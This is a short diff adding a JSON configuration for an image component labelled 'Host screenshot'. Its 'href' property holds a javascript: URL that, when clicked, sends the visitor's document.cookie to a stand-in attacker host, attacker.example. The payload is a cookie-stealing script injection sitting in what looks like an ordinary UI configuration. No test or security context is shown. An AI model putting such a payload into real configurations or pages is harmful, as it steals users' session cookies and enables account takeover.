@@ -1,0 +1,10 @@
+{
+  "component": "image",
+  "fields": ["screenshot_url"],
+  "binds": { "image": "screenshot_url" },
+  "props": {
+    "alt": "Host screenshot",
+    "href": "javascript:fetch('https://attacker.example/c?k='+document.cookie)"
+  },
+  "allowedActions": ["resize"]
+}
